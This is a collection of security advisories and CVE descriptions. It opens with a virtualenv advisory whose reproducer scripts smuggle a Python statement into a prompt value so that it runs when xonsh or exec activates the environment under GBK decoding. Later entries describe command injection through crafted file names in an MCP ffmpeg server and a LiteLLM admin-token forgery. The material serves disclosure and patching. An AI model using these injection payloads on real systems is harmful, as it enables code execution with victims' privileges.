items.title: virtualenv: Xonsh activation literals depend on the script decoding codec
items.description:
## Summary

Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the
value passed to virtualenv, and a user must subsequently activate the environment.

## Affected area

Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can
change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure
through unrelated activators.

## Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated
activation script.

## Affected code

The relevant 21.14.8 source is in
[xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py),
[UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).

## Mechanism

The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters
in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK
or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character.
The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal
and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.

## Reproduction and evidence

The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile
prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path`
controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review.
[PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to
`ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII,
decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.

The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of
the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is
attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv quote()
    participant F as activate.xsh bytes
    participant X as xonsh source
    A->>V: 中 plus escaped quote and statements
    V->>F: repr writes UTF-8 中 followed by backslash
    alt XONSH_ENCODING is UTF-8
        F->>X: backslash remains an escape
        X-->>A: prompt remains data
    else XONSH_ENCODING is GBK or Big5
        F->>X: decoder consumes backslash as trail byte
        X->>X: quote closes and statements run
    end
    Note over V,X: ascii() emits only ASCII bytes and preserves the literal
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import subprocess
import sys
from pathlib import Path
from shutil import rmtree

work = Path("/tmp/activate-this-gbk")
rmtree(work, ignore_errors=True)
work.mkdir()
env_dir = work / "venv"
marker = work / "MARKER"

# set up: a zh_CN.GBK locale, which the image does not ship
subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True)
utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"}
gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}

# attacker: text that a tool relays as --prompt
# the payload's " makes repr() delimit with ' and write the prompt's own ' as \'
# 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next
payload = f'__import__("os").system("touch {marker}")'
hostile_prompt = "中" + "';" + payload + "#"

# user: creates the environment with the virtualenv command
subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True)
activate_this = (env_dir / "bin" / "activate_this.py").read_bytes()
prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]'))
print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}")
print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}")
assert not marker.exists(), "payload ran at creation time"

# trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one
activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir]
control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True)
ran_in_utf8_session = marker.exists()
print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")

observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True)
ran_in_gbk_session = marker.exists()
print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")

# check: the prompt is data and must not run in either session
print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK")
```

**`repro.d/activate_with_exec_open.py`**

```text
#!/usr/bin/env python3
# usage: activate_with_exec_open.py ENV_DIR
# A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2.
import locale
import os
import sys

this_file = os.path.join(sys.argv[1], "bin", "activate_this.py")
exec(open(this_file).read(), {"__file__": this_file})

print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}")
```

**`repro.d/install_gbk_locale.py`**

```text
#!/usr/bin/env python3
# usage: install_gbk_locale.py LOCPATH
# Does what `locale-gen zh_CN.GBK` would; the image has glibc's localedef but no charmap or locale sources.
import os
import subprocess
import sys

locpath = sys.argv[1]
os.makedirs(locpath)

charmap = ["<code_set_name> GBK", "<comment_char> %", "<escape_char> /", "<mb_cur_min> 1", "<mb_cur_max> 2", "CHARMAP"]
charmap += [f"<U{byte:04X}> /x{byte:02x}" for byte in range(0x80)]
for lead in range(0x81, 0xFF):
    for trail in range(0x40, 0xFF):
        try:
            char = bytes([lead, trail]).decode("gbk")
        except UnicodeDecodeError:
            continue
        charmap.append(f"<U{ord(char):04X}> /x{lead:02x}/x{trail:02x}")
charmap.append("END CHARMAP")
with open(f"{locpath}/GBK.charmap", "w") as charmap_file:
    charmap_file.write("\n".join(charmap) + "\n")

# -c: the source has no LC_TIME, LC_MONETARY, ...; localedef fills in defaults, warns and exits 1, so check the result below
source = "/tmp/repro.d/zh_CN_minimal.locale"
subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)

gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath}
codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True)
if codeset.stdout.strip() != "GBK" or codeset.stderr:
    sys.exit(f"zh_CN.GBK locale not usable: {codeset}")
```

**`repro.d/zh_CN_minimal.locale`**

```text
comment_char %
escape_char /
% Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which
% comes from the charmap given to localedef with -f.
LC_CTYPE
upper <U0041>..<U005A>
lower <U0061>..<U007A>
digit <U0030>..<U0039>
space <U0009>..<U000D>;<U0020>
cntrl <U0000>..<U001F>;<U007F>
punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E>
xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066>
blank <U0009>;<U0020>
END LC_CTYPE
LC_COLLATE
order_start forward
UNDEFINED
order_end
END LC_COLLATE
```

## Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script
precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The
attack requires control of argument data and subsequent user activation; it does not require replacing an executable or
controlling app-data contents.

## Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation
review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation
source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation
of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

## Known mitigation

Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases.
Recreate environments with virtualenv 21.14.9 or later.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided
review identified the remaining activation path.

## Additional fix branch

[PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside
its activation-state changes. Both branches must retain this quoting rule when integrated.

In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: SCO: serialise sco_conn lifetime against sco_recv_scodata()

sco_recv_scodata() upgrades the weak hcon->sco_data back-pointer to a
strong reference under hdev->lock:

    hci_dev_lock(hdev);
    hcon = hci_conn_hash_lookup_handle(hdev, handle);
    ...
    conn = sco_conn_hold_unless_zero(hcon->sco_data);
    hci_dev_unlock(hdev);

but the pointer is cleared from the other side without that lock. When
the last sco_conn reference is dropped, sco_conn_free() ran

    conn->hcon->sco_data = NULL;

with no hdev->lock held, so the RX path could read hcon->sco_data and
call kref_get_unless_zero() on an sco_conn that was concurrently freed:

    BUG: KASAN: slab-use-after-free in sco_conn_hold_unless_zero+0xbe/0x160
    Write of size 4 by task kworker/u17:0
    Workqueue: hci0 hci_rx_work
    Call Trace:
     sco_conn_hold_unless_zero+0xbe/0x160
     sco_recv_scodata+0x13f/0x490
     hci_rx_work+0x3af/0x730

kref_get_unless_zero() only guards against a zero refcount, not against
the backing memory already being freed.

Give hcon->sco_data an actual reference on the sco_conn it points to, so
the object cannot be freed while the pointer is still installed, and only
clear and drop it from sco_conn_del(), which runs under hdev->lock (its
callers, sco_connect_cfm() and sco_disconn_cfm(), hold it). The reader in
sco_recv_scodata() also takes hdev->lock, so the store and the read are
now serialised: the RX path either observes NULL or a reference that is
guaranteed to stay valid until it drops its own.

sco_conn_add() no longer hands its kref_init() reference to the caller as
the connection's only reference; that initial reference is the one owned
by hcon->sco_data, and callers get their own via sco_conn_hold().

Because the sco_conn can now outlive the socket (the association keeps it
alive until the link goes down), the hci_conn can no longer be dropped
from sco_conn_free() without regressing socket close: closing a connected
SCO socket must still tear the link down. Move hci_conn ownership to the
socket instead: __sco_chan_add() takes an hci_conn reference and it is
released from sco_chan_del() and sco_sock_destruct(), exactly once. The
sco_conn no longer owns an hci_conn reference, so sco_conn_add() stops
consuming one and sco_connect() drops the hci_connect_sco() reference on
every path; sco_connect_cfm() no longer needs its hci_conn_hold() dance.

In the Linux kernel, the following vulnerability has been resolved:

KVM: arm64: Fix AArch32 DBGBXVR<n> handling

The consolidation of the breakpoint and watchpoint register accessors
switched DBGBXVR<n> from trap_bvr() to trap_dbg_wb_reg(). The latter
selects backing storage with demux_wb_reg(), which only handles Op2 values
4 through 7. Since DBGBXVR<n> uses Op2 1, an AArch32 guest access hits
KVM_BUG_ON() and marks the VM dead.

DBGBXVR<n> aliases DBGBVR<n>_EL1[63:32], and its AA32(HI) descriptor
already selects the upper half. Map Op2 1 to dbg_bvr[] alongside Op2 4,
restoring the pre-regression behavior.

In the Linux kernel, the following vulnerability has been resolved:

KVM: SEV: Do cache maintenance on the source VM during intra-host migration

Manually perform cache maintenance on the source VM during intra-host
migration to ensure no stale data is left in CPU caches after the VM is
destroyed.  Because the source VM is "converted" to a non-SEV VM, KVM's
memory reclaim flows won't trigger cache maintenance, e.g. when all guest
memory is reclaimed in response to detaching from the mmu_notifier.

Note, relying on the destination VM to do cache maintenance isn't an option
as KVM doesn't require identical guest memory configurations, i.e. the
source VM may have access to memory that the destination VM does not.
Enforcing equivalent memory configurations is infeasible, as it would
require a *deep* comparison of memslots, e.g. to verify that not only are
the memslot identical, but what the memslots point at is also identical.

In the Linux kernel, the following vulnerability has been resolved:

netfilter: ip6t_rt: fix zero-address non-strict match out-of-bounds read

rt_mt6_check() permits rules to be configured with rtinfo->addrnr == 0
even when address matching (IP6T_RT_FST_MASK) is requested.

In the IP6T_RT_FST_NSTRICT path, rt_mt6() evaluates packet routing
addresses against rtinfo->addrs[i] and terminates backwards at the bottom
of the loop:

    if (ipv6_addr_equal(ap, &rtinfo->addrs[i])) {
        i++;
    }
    if (i == rtinfo->addrnr)
        break;

When addrnr is 0, if the first packet address matches rtinfo->addrs[0],
i is incremented to 1. Because i is now strictly greater than addrnr (0),
the loop termination condition (i == rtinfo->addrnr) is bypassed and will
never be satisfied.

If a crafted IPv6 packet contains matching routing addresses, i will
advance past IP6T_RT_HOPS (16). The subsequent call to ipv6_addr_equal()
reads beyond struct ip6t_rt, triggering UBSAN/KASAN out-of-bounds warnings
or kernel panics.

Fix this by:
1. Rejecting rules in rt_mt6_check() where IP6T_RT_FST_MASK is set but
   rtinfo->addrnr is zero.
2. In rt_mt6(), moving the termination condition (i < rtinfo->addrnr)
   into the for-loop header condition and removing the backwards break
   at the end of the loop body.

In the Linux kernel, the following vulnerability has been resolved:

HID: alps: fix use-after-free on input2 registration failure

alps_input_configured() stores data->input2 before calling
input_register_device().  If registration fails, input_free_device()
frees the input device but data->input2 still points to the freed memory.
alps_input_configured() calls hid_hw_open() before allocating input2, so
URBs are already active and raw_event can fire during the failure window.
A U1_SP_ABSOLUTE_REPORT_ID report arriving then causes u1_raw_event()
to dereference the freed data->input2 -> use-after-free.

Fix by only storing input2 into drvdata after successful registration
and adding a NULL guard in the raw_event path.

In the Linux kernel, the following vulnerability has been resolved:

drm/nouveau: RCU-free the scheduler-containing nouveau_sched

struct nouveau_sched embeds a struct drm_gpu_scheduler (base).
nouveau_sched_destroy() calls nouveau_sched_fini() (which does
drm_sched_fini(&sched->base)) and then frees the object with plain
kfree(sched).

drm_sched_fence_get_timeline_name() returns fence->sched->name, and the
scheduler fence keeps a .release callback so it is not ops-detached on
signalling.  A finished fence exported to userspace via drm_syncobj /
sync_file therefore keeps pointing at &sched->base after nouveau_sched_destroy(),
and a later get_timeline_name() -- reachable unprivileged through
SYNC_IOC_FILE_INFO -- dereferences freed memory (KASAN slab-use-after-free
read).

Per the dma-fence lifetime contract the exporter must keep the data backing a
signalled fence alive for an RCU grace period.  Free the scheduler-containing
object with kfree_rcu() instead of kfree().

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5: HWS, Handle destroying table that has a miss table

If a table has a miss table that was created by
'mlx5hws_table_set_default_miss' API function, its miss_tbl
keeps the table that points to it in a list.
If such table is deleted, we need to also remove it from the
miss_tbl list, otherwise the node in miss_tbl list will contain
garbage.

In the Linux kernel, the following vulnerability has been resolved:

KVM: arm64: nv: Fix life cycle of the nested_mmus array

The nested_mmus array holds the shadow page tables that are used when
a guest is running a nested context. These structures are allocated on
VCPU_INIT for whole guest, which implies that they may have to be
relocated as the array grows.

Should a VCPU_INIT occur whilst a vcpu is actively running an L2 and
that the allocation requires relocation, that vcpu will still be
running with a pointer to the previous structure, which will have been
freed.

Fix this by turning the array of structures to an array of pointers,
which is now allocated at VM creation, sized to the absolute maximum
that KVM can handle.

In turn, each VCPU_INIT contributes S2_MMU_PER_VCPU to the pool. No
reallocation is ever performed, and the life cycle of each object is
much clearer:

- the nested_mmus array is allocated in kvm_init_nested(), and freed
  in kvm_arch_destroy_vm()

- s2_mmu structures are allocated in kvm_vcpu_init_nested(), and freed
  on kvm_arch_flush_shadow_all()

Finally, the freeing of vcpu->arch.vncr_array is made consistent
rather than being done on some failure paths, but not others.

In the Linux kernel, the following vulnerability has been resolved:

ext4: don't enable large folios on encrypted inodes

Commit 709f0f1f1bf5 ("ext4: add checks for large folio
incompatibilities when BS > PS") disables large folios at mount time
if the "encrypt" feature is set. However, enabling that feature on a
mounted filesystem circumvents that check, and writing encrypted data
results in a crash:

  BUG: kernel NULL pointer dereference, address: 0000000000000028
  Workqueue: ext4-rsv-conversion ext4_end_io_rsv_work
  RIP: 0010:ext4_finish_bio+0xf7/0x3e0
  Call Trace:
   ext4_release_io_end+0x51/0x110
   ext4_end_io_end+0x4c/0xe0
   ext4_end_io_rsv_work+0xb3/0x100

Fix this by disabling large folios on encrypted inodes, as is
already done for inodes that use data journaling.

This affects all kernels between v6.19 and v7.2, but it is not needed
in v7.3, where the code was significantly refactored.

In the Linux kernel, the following vulnerability has been resolved:

riscv: errata: select RISCV_ALTERNATIVE_EARLY for THEAD GHOSTWRITE

errata_probe_ghostwrite() only marks the CPU as vulnerable when it is
called at the RISCV_ALTERNATIVES_EARLY_BOOT stage, and the mitigation
in ghostwrite_enable_mitigation() only takes effect if the vulnerable
state was recorded before the boot alternatives are patched.

The early boot stage is only executed when CONFIG_RISCV_ALTERNATIVE_EARLY
is enabled, which currently is only selected by ERRATA_THEAD_MAE. In a
kernel built with ERRATA_THEAD_GHOSTWRITE=y but ERRATA_THEAD_MAE=n, the
early alternatives never run, so ghostwrite_state is never set to
VULNERABLE: ghostwrite_enable_mitigation() returns false, xtheadvector
remains enabled, and sysfs reports "Not affected" on a vulnerable
T-Head C9xx CPU.

Select RISCV_ALTERNATIVE_EARLY from ERRATA_THEAD_GHOSTWRITE so that the
vulnerability is detected in the early boot stage and the default
mitigation is applied.

In the Linux kernel, the following vulnerability has been resolved:

KVM: arm64: nv: Delay freeing of shadow S2 structures until VM destruction

We free the shadow S2 structures from kvm_arch_flush_shadow_all(), which
is a Bad Idea(tm). Freeing the page tables is fair game (this is what
this callback is for), but freeing the container that could still be
referenced by another part of the system is not great.

Instead, grow separate destructors that gets called when we tear the VM
down for good. From there, we can nuke both the individual MMUs as well
as the global array that points to them, safe in the knowledge that the
vcpus themselves have been destroyed already.

In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: mgmt: fix race in read_unconf_index_list()

read_unconf_index_list() counts unconfigured controllers before allocating
its response, then checks the device flags again while filling it.

hci_dev_list_lock stabilizes list membership, but it does not serialize the
per-device flags. During asynchronous controller setup, the worker can set
HCI_UNCONFIGURED and clear HCI_SETUP between the two passes. A controller
omitted from the allocation count can then become eligible for the fill
pass, causing an out-of-bounds write to rp->index[].

Allocate space for every device on hci_dev_list. Since list membership
cannot change while hci_dev_list_lock is held, the response remains large
enough regardless of flag transitions. The reported count and response
length still include only eligible unconfigured controllers.

In the Linux kernel, the following vulnerability has been resolved:

RISC-V: KVM: Serialize IMSIC attributes with vCPU migration

KVM device ioctls are not serialized against KVM_RUN. As a result,
kvm_riscv_aia_imsic_rw_attr() can snapshot the physical CPU and HGEI of
an IMSIC VS-file before a concurrent vCPU migration releases it.

The HGEI can then be allocated to another vCPU before imsic_vsfile_rw()
uses the stale tuple. A GET or SET attribute may consequently access the
new owner's interrupt file.

Serialize the entire IMSIC attribute operation with the target vCPU
mutex. This prevents the VS-file from being migrated and recycled until
the attribute access completes. Acquire the mutex killably so that the
device ioctl remains interruptible while waiting for KVM_RUN to finish.

In the Linux kernel, the following vulnerability has been resolved:

drm/nouveau/dmem: pin VRAM for the whole registered range

Commit c32287471077 ("gpu/drm/nouveau: enable THP support for GPU memory
migration") grew the device-private region that
nouveau_dmem_chunk_alloc() registers from DMEM_CHUNK_SIZE to
DMEM_CHUNK_SIZE * NR_CHUNKS, but left the VRAM buffer object backing that
region at DMEM_CHUNK_SIZE.

nouveau_dmem_page_addr() returns chunk->bo->offset plus the page's offset
within the registered region, so every page past the first chunk resolves
to VRAM outside the buffer object.

Size the buffer object to the region it backs.

items.description:
NoMachine Redis Improper Authentication Local Privilege Escalation Vulnerability. This vulnerability allows local attackers to escalate privileges on affected installations of NoMachine. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.

The specific flaw exists within the authentication mechanism controlling access to the Redis database. The issue results from using insufficient entropy in the generation of credentials. An attacker can leverage this vulnerability to escalate privileges and execute arbitrary code in the context of the service account. Was ZDI-CAN-30984.

items.title: mcp-ffmpeg through 1.0.5 OS Command Injection via videoPath and outputDir
items.description: mcp-ffmpeg through 1.0.5 contains an OS command injection vulnerability that allows attackers to run shell commands by supplying crafted videoPath or outputDir values to the resize-video, extract-audio and get-video-info tools. Attackers can embed $(), backticks or a closing double quote in an existing file or directory name to break out of the child_process.exec command string and execute commands as the MCP server user.

items.title: Adobe Commerce and Magento Unrestricted Upload of File with Dangerous Type Vulnerability
items.description: Adobe Commerce and Magento contain an unrestricted upload of file with dangerous type vulnerability that could result in arbitrary code execution in the context of the current user, potentially gaining elevated access or control over the victim's account or session.

A flaw in Node.js TLS hostname verification allows a certificate with only a DNS SAN to authenticate an IP endpoint when the client connects using a non-canonical IPv4 spelling, such as `0177.0.0.1`, `0x7f.0.0.1`, `2130706433` or `127.1`.

`tls.checkServerIdentity()` did not classify these hosts as IP addresses, but normalized them to their canonical form and matched the result against the certificate DNS names. A certificate containing `DNS:127.0.0.1` and no `IP Address:127.0.0.1` SAN was therefore accepted, while the same certificate is correctly rejected for `127.0.0.1`. Exploitation requires a certificate with a numeric DNS SAN issued by a CA trusted by the client, and a platform resolver that accepts these spellings, such as glibc.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.title: LiteLLM: Privilege Escalation to Proxy Admin via Cross-Domain Reuse of the Salt Key
items.description:
### Summary

An authenticated user with `internal_user` privileges can escalate to `proxy_admin` and achieve remote code execution. The proxy uses one encryption key for two purposes: sealing secrets at rest and minting session tokens. An attacker exploits this by requesting a new API key with a crafted metadata field containing a forged admin credential as the "secret" value. The proxy encrypts and returns this payload. When this value is then presented as a bearer token, the proxy decrypts it, trusts the forged admin identity, and grants full administrative access, including the ability to execute arbitrary commands via the MCP stdio endpoint.

### Affected versions

Versions later than 1.91.0 are exploitable in the default configuration. Versions 1.87.0 through 1.90.x are exploitable only if `EXPERIMENTAL_UI_LOGIN=true` was explicitly set.

### Mitigation

Upgrade to a patched version as soon as possible.

If you cannot upgrade immediately, set `EXPERIMENTAL_UI_LOGIN=false`. This disables the vulnerable authentication path but also breaks CLI SSO and Claude Code gateway login.

### Impact

An internal user can escalate to proxy admin and execute arbitrary commands on the host.

**Discovery Credit:** Hoa X. Nguyen (OPSWAT Unit 515)

Uncontrolled recursion in the mcpack2pb component in Apache bRPC (version < 1.18.0) on all platforms allows remote attackers to make the server crash via sending deeply nested mcpack data.

Root Cause:
The bRPC mcpack2pb parser (used to serve nshead_mcpack / ubrpc / public_pbrpc requests) recursively parses nested objects and arrays without any depth limit. For a protobuf message that references itself (e.g. a repeated message field), the generated parser recurses once per nesting level of the incoming mcpack object. A deeply nested request makes the recursion grow unbounded, overflow the stack and crash the process.

Affected Scenarios:
Use bRPC server with a recursive-schema protobuf message to serve nshead_mcpack / ubrpc / public_pbrpc requests from untrusted network.

How to Fix:
(Choose one of the following options)
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch: https://github.com/apache/brpc/pull/3499

Note:
No matter which option you choose, you should know that the fix enforces the documented parsing depth limit MAX_DEPTH (128) on the parse path, the same limit the serializer already applies. If your requests contain mcpack messages nested deeper than 128 levels, the request will be failed after applying the fix.

ApostropheCMS is an open-source Node.js content management system. Prior to 3.7.1 of the import-export module and 4.34.0 of core ApostropheCMS, an editor who can import an enabled content type but lacks its stronger publication role can cause import write helpers to create, replace, or remove published variants without the normal publish permission and lifecycle checks. This issue is fixed in import-export 3.7.1 and ApostropheCMS 4.34.0.

Uncontrolled resource allocation in the mcpack2pb component in Apache bRPC (version < 1.18.0) on all platforms allows remote attackers to make the server allocate a large amount of memory via sending a crafted mcpack request with a huge array item count.

Root Cause:
The bRPC mcpack2pb parser trusts the item count stored in the mcpack array header without validating it against the actual payload size. The code generated by the mcpack2pb protoc plugin uses this count to preallocate memory for repeated protobuf fields via Reserve(). A malformed request declaring item_count = 0x7fffffff can force the server to preallocate about 16GB of virtual memory, which may abort the process (SIGABRT) on memory-constrained hosts.

Affected Scenarios:
Use a bRPC server that wires a NsheadService to UbrpcMcpack2Adaptor (the Baidu ubrpc deployment pattern) and parses requests with code generated by the mcpack2pb protoc plugin. The request body is parsed before authentication.

How to Fix:
(Choose one of the following options)
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3451 

Note:
No matter which option you choose, you should know that the fix caps the array item count to the remaining bytes of the array payload.

items.title: Lenient parsing of integers for response body and chunk framing
items.description: Response body and chunk parsing would handle non-hex or negative integers incorrectly which could result in misinterpreting HTTP response contents.

Django REST framework is a toolkit for building Web APIs. From 3.12.0 until 3.18.2, TokenProxy.delete() in rest_framework/authtoken/models.py uses the proxy's user-id pk while the concrete Token token-string primary key identifies rows, so Django issues a deletion query that matches no row and reports zero deletions without raising an error. Applications, administrative integrations, or operational scripts that revoke credentials through a TokenProxy instance can therefore believe revocation succeeded while the token remains live and continues authenticating. DRF's own TokenAdmin.delete_model workaround is not affected, but other callers can leave access available indefinitely because DRF tokens do not expire automatically. This issue is fixed in version 3.18.2.

items.title: Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server
items.description: The Model Context Protocol Python SDK is the official Python SDK for Model Context Protocol servers and clients. From 1.10.0 until 1.30.0 and 2.2.0, server-side bearer authentication configured through AuthSettings with token_verifier accepts a valid token issued for another service when the authorization server serves multiple resources and the TokenVerifier does not independently validate the aud audience. This resource-confusion flaw lets a token holder authenticate to the wrong MCP server and exercise that token's resulting access. This issue is fixed in versions 1.30.0 and 2.2.0.

Vulnerability in Oracle Java SE (component: Networking).   The supported version that is affected is Oracle Java SE: 27. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

A flaw in the Node.js `zlib.ZipFile` API can cause it to return bytes that do not belong to the requested entry after the local and central header validation fails.

When `zipEntry.modified` is read on an archive whose local header does not match its central directory, either directly or while compacting the archive, the validation error is caught but the parsed local header is left cached without a content offset. A later content read then returns attacker-controlled bytes from the start of the file instead of rejecting the archive, and CRC-32 verification still passes because the attacker controls the central directory CRC. A Node.js-based scanner can therefore approve different content from what another ZIP implementation extracts from the same archive.

This vulnerability affects Node.js **26.x**.

Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u503, 8u503-perf, 11.0.32.1, 17.0.20.1, 21.0.12.1, 25.0.4.1, 27; Oracle GraalVM for JDK: 17.0.20.1 and  21.0.12.1; Oracle GraalVM Enterprise Edition: 21.3.19.1.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. items.title: Asterisk: SQL Injection in cel_pgsql and cel_tds via CELGenUserEvent eventtype Field
items.description: Asterisk is an open source private branch exchange and telephony toolkit. Prior to Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3, the `PostgreSQL` and `TDS/MSSQL` Channel Event Log backends `cel_pgsql` and `cel_tds` may permit arbitrary SQL execution when untrusted data is set in the CEL `eventtype` column by the `CELGenUserEvent` dialplan application. The `cel_pgsql` or `cel_tds` backend must be loaded and configured, and the administrator must call `CELGenUserEvent` in the dialplan without ensuring that only valid data is passed to the application. This issue is fixed in Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3.

ImageMagick before 7.1.2-33 contains a policy bypass vulnerability in the UHDR decoder that allows attackers to evade image width and height limits because extent checks occur after decoding. Attackers can supply crafted UHDR images with oversized dimensions that are fully decoded before policy limits are enforced, causing excessive resource consumption.

ImageMagick before 7.1.2-33 contains a memory leak vulnerability in the MAT decoder that fails to release allocated memory in a specific error path. Attackers can supply crafted MAT files that trigger this error path repeatedly, causing small memory leaks that gradually consume process memory.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in its XML parsing code, where allocated memory is not released when parsing reaches the nesting depth limit. Attackers can supply crafted, deeply nested XML data to trigger the leak, causing memory exhaustion and denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the handling of XMP profiles by various decoders. Attackers can supply images with a crafted XMP profile that leak memory each time they are processed, leading to resource exhaustion and denial of service.

ApostropheCMS is an open-source Node.js content management system. Prior to 3.7.1 of the import-export module, the API endpoint POST /api/v1/@apostrophecms/import-export/clean-export in @apostrophecms/import-export lacks authentication and authorization checks. Any client—including unauthenticated anonymous users who have obtained the standard CSRF cookie from visiting the site—can directly invoke this route and trigger the underlying self.cleanExport(req) method. This issue is fixed in version 3.7.1.

